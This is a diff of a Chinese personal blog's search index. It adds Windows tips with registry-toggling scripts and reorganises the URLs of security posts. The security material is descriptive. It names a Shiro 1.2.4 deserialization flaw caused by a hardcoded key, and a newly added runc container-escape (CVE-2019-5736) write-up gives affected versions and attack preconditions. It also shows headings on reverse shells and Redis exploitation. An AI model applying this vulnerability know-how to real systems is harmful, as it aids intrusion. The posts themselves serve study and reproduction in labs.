@@ -1,8 +1,62 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>Windows10更改用户名方式</title>
+    <url>/2021/12/03/windows%E6%8A%80%E5%B7%A7/Windows10%E6%9B%B4%E6%94%B9%E7%94%A8%E6%88%B7%E5%90%8D%E6%96%B9%E5%BC%8F/</url>
+    <content><![CDATA[<h2 id="更改方式"><a href="#更改方式" class="headerlink" title="更改方式"></a>更改方式</h2><hr>
+<p>使用管理员权限打开一个CMD</p>
+<h3 id="修改用户名"><a href="#修改用户名" class="headerlink" title="修改用户名"></a>修改用户名</h3><p>输入 <code>control userpasswords2</code> ，回车；</p>
+<p>点击属性，修改用户名，点击确定；</p>
+<h3 id="注册表修改路径位置"><a href="#注册表修改路径位置" class="headerlink" title="注册表修改路径位置"></a>注册表修改路径位置</h3><p>打开运行，输入regedit，回车；<br>定位到</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList；</span><br></pre></td></tr></table></figure>
+<p>选中下面名字最长的项，双击右侧的ProfileImagePath，修改 C:\Users\ 后的用户名，点击确定；</p>
+<p>注销并重新登录；</p>
+<h3 id="重命名用户文件夹"><a href="#重命名用户文件夹" class="headerlink" title="重命名用户文件夹"></a>重命名用户文件夹</h3><p>打开 C:\User\，</p>
+<p>将新的用户名文件夹删除，</p>
+<p>再将原来的的用户名文件夹重命名为新的用户名；</p>
+<p>再次注销并重新登录。</p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://blog.csdn.net/u011479200/article/details/107902826">https://blog.csdn.net/u011479200/article/details/107902826</a></p>
+]]></content>
+      <categories>
+        <category>Windows技巧</category>
+      </categories>
+      <tags>
+        <tag>技巧</tag>
+        <tag>Windows</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Windows下快速切换全拼/双拼</title>
+    <url>/2021/11/09/windows%E6%8A%80%E5%B7%A7/Windows%E4%B8%8B%E5%BF%AB%E9%80%9F%E5%88%87%E6%8D%A2%E5%85%A8%E6%8B%BC-%E5%8F%8C%E6%8B%BC/</url>
+    <content><![CDATA[<h1 id="Windows下快速切换全拼-双拼"><a href="#Windows下快速切换全拼-双拼" class="headerlink" title="Windows下快速切换全拼/双拼"></a>Windows下快速切换全拼/双拼</h1><h2 id="bat批处理文件方式"><a href="#bat批处理文件方式" class="headerlink" title="bat批处理文件方式"></a>bat批处理文件方式</h2><h3 id="change-bat"><a href="#change-bat" class="headerlink" title="change.bat"></a>change.bat</h3><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> Mainkey=HKCU\SOFTWARE\Microsoft\InputMethod\Settings\CHS </span><br><span class="line"><span class="keyword">for</span> /f <span class="variable">%%i</span> <span class="keyword">in</span> (&#x27;reg query <span class="variable">%MainKey%</span> /v &quot;Enable Double Pinyin&quot; ^| <span class="built_in">findstr</span> /i &quot;<span class="number">0</span>x1&quot;&#x27;) <span class="keyword">do</span> (<span class="built_in">set</span> flg=<span class="variable">%%i</span>) </span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> <span class="keyword">defined</span> flg ( reg add <span class="variable">%MainKey%</span> /v &quot;Enable Double Pinyin&quot; /t REG_DWORD /d <span class="number">0</span>x1 /f ) <span class="keyword">else</span> ( reg add <span class="variable">%MainKey%</span> /v &quot;Enable Double Pinyin&quot; /t REG_DWORD /d <span class="number">0</span>x0 /f )</span><br><span class="line"><span class="built_in">pause</span></span><br></pre></td></tr></table></figure>
+
+
+<h3 id="ChangeAll-bat"><a href="#ChangeAll-bat" class="headerlink" title="ChangeAll.bat"></a>ChangeAll.bat</h3><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> Mainkey=HKCU\SOFTWARE\Microsoft\InputMethod\Settings\CHS</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> /f <span class="variable">%%i</span> <span class="keyword">in</span> (&#x27;reg query <span class="variable">%MainKey%</span> /v &quot;Enable Double Pinyin&quot; ^| <span class="built_in">findstr</span> /i &quot;<span class="number">0</span>x1&quot;&#x27;) <span class="keyword">do</span> (<span class="built_in">set</span> flg=<span class="variable">%%i</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> <span class="keyword">defined</span> flg (</span><br><span class="line"><span class="comment">    @REM reg add %MainKey% /v &quot;Enable Double Pinyin&quot; /t REG_DWORD /d 0x1 /f</span></span><br><span class="line">) <span class="keyword">else</span> (</span><br><span class="line">    reg add <span class="variable">%MainKey%</span> /v &quot;Enable Double Pinyin&quot; /t REG_DWORD /d <span class="number">0</span>x0 /f</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+
+
+<h3 id="ChangeDouble-bat"><a href="#ChangeDouble-bat" class="headerlink" title="ChangeDouble.bat"></a>ChangeDouble.bat</h3><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> Mainkey=HKCU\SOFTWARE\Microsoft\InputMethod\Settings\CHS</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> /f <span class="variable">%%i</span> <span class="keyword">in</span> (&#x27;reg query <span class="variable">%MainKey%</span> /v &quot;Enable Double Pinyin&quot; ^| <span class="built_in">findstr</span> /i &quot;<span class="number">0</span>x1&quot;&#x27;) <span class="keyword">do</span> (<span class="built_in">set</span> flg=<span class="variable">%%i</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> <span class="keyword">defined</span> flg (</span><br><span class="line">    reg add <span class="variable">%MainKey%</span> /v &quot;Enable Double Pinyin&quot; /t REG_DWORD /d <span class="number">0</span>x1 /f</span><br><span class="line">) <span class="keyword">else</span> (</span><br><span class="line"><span class="comment">    @REM reg add %MainKey% /v &quot;Enable Double Pinyin&quot; /t REG_DWORD /d 0x0 /f</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="built_in">pause</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="VBS脚本方式"><a href="#VBS脚本方式" class="headerlink" title="VBS脚本方式"></a>VBS脚本方式</h2><h3 id="vbs"><a href="#vbs" class="headerlink" title="vbs"></a>vbs</h3><figure class="highlight vbs"><table><tr><td class="code"><pre><span class="line"><span class="built_in">CreateObject</span>(<span class="string">&quot;WScript.Shell&quot;</span>).Run <span class="string">&quot;ChangeAll.bat&quot;</span>,<span class="number">0</span></span><br><span class="line"><span class="built_in">CreateObject</span>(<span class="string">&quot;WScript.Shell&quot;</span>).Run <span class="string">&quot;ChangeDouble.bat&quot;</span>,<span class="number">0</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="uTools插件"><a href="#uTools插件" class="headerlink" title="uTools插件"></a>uTools插件</h2><p>目前已经做成了 uTools 插件 , 插件名称 : <code>切换微软全拼</code></p>
+<p>项目地址: <a href="https://github.com/syyu6/utools-ChangeDouble">https://github.com/syyu6/utools-ChangeDouble</a></p>
+<p>And so on …</p>
+<h2 id="utools快捷命令"><a href="#utools快捷命令" class="headerlink" title="utools快捷命令"></a>utools快捷命令</h2><h3 id="实现-ps1-脚本"><a href="#实现-ps1-脚本" class="headerlink" title="实现 ps1 脚本"></a>实现 ps1 脚本</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$out</span> = reg query HKCU\SOFTWARE\Microsoft\InputMethod\Settings\CHS /v <span class="string">&quot;Enable Double Pinyin&quot;</span>; </span><br><span class="line"><span class="variable">$outStr</span> = <span class="variable">$out</span> <span class="operator">-as</span> [<span class="built_in">string</span>]; </span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$outStr</span> <span class="operator">-match</span> <span class="string">&#x27;(Pinyin.+0x)(\d)&#x27;</span>) &#123;<span class="variable">$mode</span> = <span class="variable">$Matches</span>[<span class="number">2</span>] &#125; <span class="keyword">else</span> &#123; <span class="variable">$mode</span> = <span class="number">1</span> &#125;; </span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$mode</span> <span class="operator">-as</span> [<span class="built_in">int</span>] <span class="operator">-eq</span> <span class="number">1</span>) &#123; <span class="variable">$Double</span> = <span class="number">0</span> &#125; <span class="keyword">else</span> &#123; <span class="variable">$Double</span> = <span class="number">1</span> &#125;;</span><br><span class="line">reg.exe add HKCU\SOFTWARE\Microsoft\InputMethod\Settings\CHS /v <span class="string">&quot;Enable Double Pinyin&quot;</span> /t REG_DWORD /d <span class="variable">$Double</span> /f;</span><br></pre></td></tr></table></figure>
+
+
+]]></content>
+      <categories>
+        <category>Windows技巧</category>
+      </categories>
+      <tags>
+        <tag>技巧</tag>
+        <tag>Windows</tag>
+        <tag>杂谈</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>KaliLinux2021安装GUI_Tools依赖问题</title>
-    <url>/2021/11/10/KaliLinux2021%E5%AE%89%E8%A3%85GUI-Tools%E4%BE%9D%E8%B5%96%E9%97%AE%E9%A2%98/</url>
+    <url>/2021/11/10/%E6%9D%82%E8%B0%88/KaliLinux2021%E5%AE%89%E8%A3%85GUI-Tools%E4%BE%9D%E8%B5%96%E9%97%AE%E9%A2%98/</url>
     <content><![CDATA[<h2 id="KaliLinux2021安装GUI-Tools依赖问题"><a href="#KaliLinux2021安装GUI-Tools依赖问题" class="headerlink" title="KaliLinux2021安装GUI_Tools依赖问题"></a>KaliLinux2021安装GUI_Tools依赖问题</h2><h3 id="WxPython库依赖问题"><a href="#WxPython库依赖问题" class="headerlink" title="WxPython库依赖问题"></a>WxPython库依赖问题</h3><hr>
 <p> <img src="https://typora-1305076737.cos.ap-shanghai.myqcloud.com/typora_image-20211003215057722.png" alt="image-20211003215057722"></p>
 <p>需要安装 <code>wxpython</code> 库 , 但是kali 下 pip3 安装, 编译会产生报错, 具体原因 我也不清楚</p>
@@ -77,7 +131,7 @@
   </entry>
   <entry>
     <title>Redis未授权访问利用方式总结</title>
-    <url>/2021/12/03/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/</url>
+    <url>/2021/12/03/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/</url>
     <content><![CDATA[<h1 id="Redis未授权访问利用方式总结"><a href="#Redis未授权访问利用方式总结" class="headerlink" title="Redis未授权访问利用方式总结"></a>Redis未授权访问利用方式总结</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>官方下载地址: <a href="https://download.redis.io/releases/">https://download.redis.io/releases/</a></p>
 <p>编译安装, </p>
 <p>或者使用Docker 环境</p>
@@ -221,62 +275,8 @@
       </tags>
   </entry>
   <entry>
-    <title>Windows10更改用户名方式</title>
-    <url>/2021/12/03/Windows10%E6%9B%B4%E6%94%B9%E7%94%A8%E6%88%B7%E5%90%8D%E6%96%B9%E5%BC%8F/</url>
-    <content><![CDATA[<h2 id="更改方式"><a href="#更改方式" class="headerlink" title="更改方式"></a>更改方式</h2><hr>
-<p>使用管理员权限打开一个CMD</p>
-<h3 id="修改用户名"><a href="#修改用户名" class="headerlink" title="修改用户名"></a>修改用户名</h3><p>输入 <code>control userpasswords2</code> ，回车；</p>
-<p>点击属性，修改用户名，点击确定；</p>
-<h3 id="注册表修改路径位置"><a href="#注册表修改路径位置" class="headerlink" title="注册表修改路径位置"></a>注册表修改路径位置</h3><p>打开运行，输入regedit，回车；<br>定位到</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList；</span><br></pre></td></tr></table></figure>
-<p>选中下面名字最长的项，双击右侧的ProfileImagePath，修改 C:\Users\ 后的用户名，点击确定；</p>
-<p>注销并重新登录；</p>
-<h3 id="重命名用户文件夹"><a href="#重命名用户文件夹" class="headerlink" title="重命名用户文件夹"></a>重命名用户文件夹</h3><p>打开 C:\User\，</p>
-<p>将新的用户名文件夹删除，</p>
-<p>再将原来的的用户名文件夹重命名为新的用户名；</p>
-<p>再次注销并重新登录。</p>
-<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://blog.csdn.net/u011479200/article/details/107902826">https://blog.csdn.net/u011479200/article/details/107902826</a></p>
-]]></content>
-      <categories>
-        <category>Windows技巧</category>
-      </categories>
-      <tags>
-        <tag>技巧</tag>
-        <tag>Windows</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Windows下快速切换全拼/双拼</title>
-    <url>/2021/11/09/Windows%E4%B8%8B%E5%BF%AB%E9%80%9F%E5%88%87%E6%8D%A2%E5%85%A8%E6%8B%BC-%E5%8F%8C%E6%8B%BC/</url>
-    <content><![CDATA[<h1 id="Windows下快速切换全拼-双拼"><a href="#Windows下快速切换全拼-双拼" class="headerlink" title="Windows下快速切换全拼/双拼"></a>Windows下快速切换全拼/双拼</h1><h2 id="bat批处理文件方式"><a href="#bat批处理文件方式" class="headerlink" title="bat批处理文件方式"></a>bat批处理文件方式</h2><h3 id="change-bat"><a href="#change-bat" class="headerlink" title="change.bat"></a>change.bat</h3><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> Mainkey=HKCU\SOFTWARE\Microsoft\InputMethod\Settings\CHS </span><br><span class="line"><span class="keyword">for</span> /f <span class="variable">%%i</span> <span class="keyword">in</span> (&#x27;reg query <span class="variable">%MainKey%</span> /v &quot;Enable Double Pinyin&quot; ^| <span class="built_in">findstr</span> /i &quot;<span class="number">0</span>x1&quot;&#x27;) <span class="keyword">do</span> (<span class="built_in">set</span> flg=<span class="variable">%%i</span>) </span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> <span class="keyword">defined</span> flg ( reg add <span class="variable">%MainKey%</span> /v &quot;Enable Double Pinyin&quot; /t REG_DWORD /d <span class="number">0</span>x1 /f ) <span class="keyword">else</span> ( reg add <span class="variable">%MainKey%</span> /v &quot;Enable Double Pinyin&quot; /t REG_DWORD /d <span class="number">0</span>x0 /f )</span><br><span class="line"><span class="built_in">pause</span></span><br></pre></td></tr></table></figure>
-
-
-<h3 id="ChangeAll-bat"><a href="#ChangeAll-bat" class="headerlink" title="ChangeAll.bat"></a>ChangeAll.bat</h3><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> Mainkey=HKCU\SOFTWARE\Microsoft\InputMethod\Settings\CHS</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> /f <span class="variable">%%i</span> <span class="keyword">in</span> (&#x27;reg query <span class="variable">%MainKey%</span> /v &quot;Enable Double Pinyin&quot; ^| <span class="built_in">findstr</span> /i &quot;<span class="number">0</span>x1&quot;&#x27;) <span class="keyword">do</span> (<span class="built_in">set</span> flg=<span class="variable">%%i</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> <span class="keyword">defined</span> flg (</span><br><span class="line"><span class="comment">    @REM reg add %MainKey% /v &quot;Enable Double Pinyin&quot; /t REG_DWORD /d 0x1 /f</span></span><br><span class="line">) <span class="keyword">else</span> (</span><br><span class="line">    reg add <span class="variable">%MainKey%</span> /v &quot;Enable Double Pinyin&quot; /t REG_DWORD /d <span class="number">0</span>x0 /f</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
-
-
-<h3 id="ChangeDouble-bat"><a href="#ChangeDouble-bat" class="headerlink" title="ChangeDouble.bat"></a>ChangeDouble.bat</h3><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> Mainkey=HKCU\SOFTWARE\Microsoft\InputMethod\Settings\CHS</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> /f <span class="variable">%%i</span> <span class="keyword">in</span> (&#x27;reg query <span class="variable">%MainKey%</span> /v &quot;Enable Double Pinyin&quot; ^| <span class="built_in">findstr</span> /i &quot;<span class="number">0</span>x1&quot;&#x27;) <span class="keyword">do</span> (<span class="built_in">set</span> flg=<span class="variable">%%i</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> <span class="keyword">defined</span> flg (</span><br><span class="line">    reg add <span class="variable">%MainKey%</span> /v &quot;Enable Double Pinyin&quot; /t REG_DWORD /d <span class="number">0</span>x1 /f</span><br><span class="line">) <span class="keyword">else</span> (</span><br><span class="line"><span class="comment">    @REM reg add %MainKey% /v &quot;Enable Double Pinyin&quot; /t REG_DWORD /d 0x0 /f</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="built_in">pause</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="VBS脚本方式"><a href="#VBS脚本方式" class="headerlink" title="VBS脚本方式"></a>VBS脚本方式</h2><h3 id="vbs"><a href="#vbs" class="headerlink" title="vbs"></a>vbs</h3><figure class="highlight vbs"><table><tr><td class="code"><pre><span class="line"><span class="built_in">CreateObject</span>(<span class="string">&quot;WScript.Shell&quot;</span>).Run <span class="string">&quot;ChangeAll.bat&quot;</span>,<span class="number">0</span></span><br><span class="line"><span class="built_in">CreateObject</span>(<span class="string">&quot;WScript.Shell&quot;</span>).Run <span class="string">&quot;ChangeDouble.bat&quot;</span>,<span class="number">0</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="uTools插件"><a href="#uTools插件" class="headerlink" title="uTools插件"></a>uTools插件</h2><p>目前已经做成了 uTools 插件 , 插件名称 : <code>切换微软全拼</code></p>
-<p>项目地址: <a href="https://github.com/syyu6/utools-ChangeDouble">https://github.com/syyu6/utools-ChangeDouble</a></p>
-<p>And so on …</p>
-<h2 id="utools快捷命令"><a href="#utools快捷命令" class="headerlink" title="utools快捷命令"></a>utools快捷命令</h2><h3 id="实现-ps1-脚本"><a href="#实现-ps1-脚本" class="headerlink" title="实现 ps1 脚本"></a>实现 ps1 脚本</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$out</span> = reg query HKCU\SOFTWARE\Microsoft\InputMethod\Settings\CHS /v <span class="string">&quot;Enable Double Pinyin&quot;</span>; </span><br><span class="line"><span class="variable">$outStr</span> = <span class="variable">$out</span> <span class="operator">-as</span> [<span class="built_in">string</span>]; </span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$outStr</span> <span class="operator">-match</span> <span class="string">&#x27;(Pinyin.+0x)(\d)&#x27;</span>) &#123;<span class="variable">$mode</span> = <span class="variable">$Matches</span>[<span class="number">2</span>] &#125; <span class="keyword">else</span> &#123; <span class="variable">$mode</span> = <span class="number">1</span> &#125;; </span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$mode</span> <span class="operator">-as</span> [<span class="built_in">int</span>] <span class="operator">-eq</span> <span class="number">1</span>) &#123; <span class="variable">$Double</span> = <span class="number">0</span> &#125; <span class="keyword">else</span> &#123; <span class="variable">$Double</span> = <span class="number">1</span> &#125;;</span><br><span class="line">reg.exe add HKCU\SOFTWARE\Microsoft\InputMethod\Settings\CHS /v <span class="string">&quot;Enable Double Pinyin&quot;</span> /t REG_DWORD /d <span class="variable">$Double</span> /f;</span><br></pre></td></tr></table></figure>
-
-
-]]></content>
-      <categories>
-        <category>Windows技巧</category>
-      </categories>
-      <tags>
-        <tag>技巧</tag>
-        <tag>杂谈</tag>
-        <tag>Windows</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>shiro1.2.4反序列化漏洞复现</title>
-    <url>/2021/11/28/shiro1.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
+    <url>/2021/11/28/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/shiro1.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
     <content><![CDATA[<h1 id="shiro-反序列化漏洞复现"><a href="#shiro-反序列化漏洞复现" class="headerlink" title="shiro 反序列化漏洞复现"></a>shiro 反序列化漏洞复现</h1><h2 id="漏洞详情"><a href="#漏洞详情" class="headerlink" title="漏洞详情"></a>漏洞详情</h2><p>Apache Shiro 是一个开源安全框架，提供身份验证、授权、密码学和会话管理。在它编号为 550 的 issue 中爆出严重的 Java 反序列化漏洞。</p>
 <p>在 Apache Shiro&lt;=1.2.4 版本中 AES 加密时采用的 key 是<strong>硬编码</strong>在代码中的，这就为伪造 cookie 提供了机会。只要 rememberMe 的 AES 加密密钥泄露，无论 shiro 是什么版本都会导致反序列化漏洞。</p>
 <p>Shiro 的 “记住我” 功能是设置 cookie 中的 rememberMe 值来实现。当后端接收到来自未经身份验证的用户的请求时，它将通过执行以下操作来寻找他们记住的身份：</p>
@@ -463,7 +463,7 @@
   </entry>
   <entry>
     <title>反弹shell方式总结</title>
-    <url>/2021/11/09/%E5%8F%8D%E5%BC%B9shell%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/</url>
+    <url>/2021/11/09/%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/%E5%8F%8D%E5%BC%B9shell%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/</url>
     <content><![CDATA[<h2 id="反弹shell方式总结"><a href="#反弹shell方式总结" class="headerlink" title="反弹shell方式总结"></a>反弹shell方式总结</h2><h4 id="nc反弹"><a href="#nc反弹" class="headerlink" title="nc反弹"></a><code>nc反弹</code></h4><ul>
 <li>场景一 (<em>正向连接</em>)</li>
 </ul>
@@ -637,7 +637,7 @@
   </entry>
   <entry>
     <title>文件上传方式总结</title>
-    <url>/2021/11/21/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/</url>
+    <url>/2021/11/21/%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/</url>
     <content><![CDATA[<h1 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h1><hr>
 <h2 id="文件上传函数"><a href="#文件上传函数" class="headerlink" title="文件上传函数"></a>文件上传函数</h2><p>PHP中 使用 move_uploaded_file()函数来上传文件，该函数的语法格式如下：</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bool move_uploaded_file ( string ``$filename` `, string ``$destination` `)</span><br></pre></td></tr></table></figure>
@@ -718,6 +718,270 @@
         <tag>杂谈</tag>
         <tag>网络安全</tag>
         <tag>CTF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>CVE-2019-5736-Docker逃逸RunC漏洞复现</title>
+    <url>/2021/12/29/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CVE-2019-5736-Docker%E9%80%83%E9%80%B8RunC%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
+    <content><![CDATA[<h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p> Docker 是一个开源的应用容器引擎，基于Go 语言并遵从Apache2.0协议开源。 Docker 可以让开发者打包他们的应用以及依赖包到一个轻量级、可移植的容器中，然后发布到 Linux 或 Windows 机器上，也可以实现虚拟化。 因为Docker容器是完全使用沙箱机制，Docker逃逸漏洞便成了Docker的漏洞主要利用方式之一。</p>
+<p> Docker逃逸RunC漏洞，在Docker 18.09.2之前的版本中使用了的RunC版本小于1.0-rc6，允许攻击者重写宿主机上的RunC 二进制文件,  从而使得宿主机以root执行命令，从而获取宿主机控制权限。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112290912214.jpg" alt="img"></p>
+<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><h3 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h3><hr>
+<blockquote>
+<p>  漏洞是指应用软件或操作系统软件在逻辑设计上的缺陷或在编写时产生的错误，这个缺陷或错误可以被不法者或者电脑黑客利用，通过植入木马、病毒等方式来攻击或控制整个电脑，从而窃取电脑中的重要资料和信息，甚至破坏系统。现代化的社会发展为人们设计了自由、共享的网络环境，这促使人们的生活、工作以及学习得到了有效改善，也为网络安全漏洞问题的突显提供了平台。</p>
+</blockquote>
+<h3 id="Docker逃逸RunC漏洞"><a href="#Docker逃逸RunC漏洞" class="headerlink" title="Docker逃逸RunC漏洞"></a>Docker逃逸RunC漏洞</h3><hr>
+<blockquote>
+<p>  CVE-2019-5736是2019年2月11日在oss-security邮件列表披露的runc容器逃逸漏洞。</p>
+<p>  在Docker 18.09.2之前的版本中使用了的runc版本小于1.0-rc6，因此允许攻击者重写宿主机上的runc 二进制文件，因此可以感觉以root的身份执行命令，导致获得宿主机的root权限。</p>
+<p>  利用方式：</p>
+<ol>
+<li> 宿主机利用攻击者提供的image来创建一个新的container 。或</li>
+<li> 拥有container root权限，并且该container后续被docker exec attach。</li>
+</ol>
+<p>   一句话描述，docker 18.09.2之前的runc存在漏洞，攻击者可以修改runc的二进制文件导致提权。</p>
+<p>   影响：</p>
+<ul>
+<li>  docker version &lt;=18.09.2 （然而实际测试的结果是docker version 18.09.1失败）</li>
+<li>  RunC version &lt;=1.0-rc6</li>
+</ul>
+</blockquote>
+<p><img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112290915562.jpg-w331s" alt="docker6"></p>
+<h2 id="相关工具及技术"><a href="#相关工具及技术" class="headerlink" title="相关工具及技术"></a>相关工具及技术</h2><h3 id="Vmware-Workstation"><a href="#Vmware-Workstation" class="headerlink" title="Vmware Workstation"></a>Vmware Workstation</h3><hr>
+<p>VMware Workstation使专业技术人员能够在同一台 PC上同时运行多个基于 x86 的 Windows、Linux 和其他操作系统，从而开发、测试、演示和部署软件。</p>
+<p>借助 VMware Workstation Pro，您可以将多个操作系统作为虚拟机（包括 Windows 虚拟机）在单台 Windows 或 Linux PC 上运行，VMware Workstation Pro 是将多个操作系统作为虚拟机 (VM) 在单台 Linux 或 Windows PC 上运行的行业标准。为任何设备、平台或云环境构建、测试或演示软件的 IT 专业人员、开发人员和企业都可以使用，可大大提升工作效率的高性能工具。开发人员将获得一个扩展性强的工程设计环境。</p>
+<p>VMware Workstation 可在一部实体机器上模拟完整的网络环境，以及可便于携带的虚拟机器，其更好的灵活性与先进的技术胜过了市面上其他的虚拟计算机软件。对于企业的 IT开发人员和系统管理员而言， VMware 在虚拟网路，实时快照，拖曳共享文件夹，支持 PXE 等方面的特点使它成为必不可少的工具。</p>
+<p>VMware Workstation 允许操作系统和应用程序在一台虚拟机内部运行。虚拟机是独立运行主机操作系统的离散环境。在 VMware Workstation 中，可以在一个窗口中加载一台虚拟机，它可以运行自己的操作系统和应用程序。可以在运行于桌面上的多台虚拟机之间切换，通过一个网络共享虚拟机，挂起和恢复虚拟机以及退出虚拟机，这一切不会影响你的主机操作和任何操作系统或者其它正在运行的应用程序。</p>
+<h3 id="Ubuntu"><a href="#Ubuntu" class="headerlink" title="Ubuntu"></a>Ubuntu</h3><hr>
+<p>Ubuntu是一个以桌面应用为主的<strong>Linux</strong>操作系统，其名称来自非洲南部祖鲁语或豪萨语的“<strong>ubuntu</strong>“一词，意思是“人性”“我的存在是因为大家的存在”，是非洲传统的一种价值观。Ubuntu基于<strong>Debian</strong>发行版和Gnome桌面环境，而从11.04版起，Ubuntu发行版放弃了<strong>Gnome</strong>桌面环境，改为Unity。从前人们认为Linux难以安装、难以使用，在Ubuntu出现后这些都成为了历史。Ubuntu也拥有庞大的社区力量，用户可以方便地从社区获得帮助。</p>
+<h3 id="Kali-Linux"><a href="#Kali-Linux" class="headerlink" title="Kali Linux"></a>Kali Linux</h3><hr>
+<p>Kali Linux 是一个基于Debian 的Linux 版本 ,面向专业的渗透测试和安全审计。可以把它理解为一个特殊的Linux发行版，集成了超过了600种精心挑选的渗透测试的工具(如 <strong>Metasploit FrameWork</strong> , <strong>Nmap</strong>等)，供渗透测试和安全设计人员使用，也可称之为平台或者框架。</p>
+<h3 id="Docker"><a href="#Docker" class="headerlink" title="Docker"></a>Docker</h3><hr>
+<p>Docker 是一个开源的应用容器引擎，基于Go 语言并遵从Apache2.0协议开源,项目主要代码在2013年开源于 GitHub。它是云服务技术上的一次创新，让应用程序布署在软件容器下的工作可以自动化进行，借此在 Linux 操作系统上，提供一个额外的软件抽象层，以及操作系统层虚拟化的自动管理机制。</p>
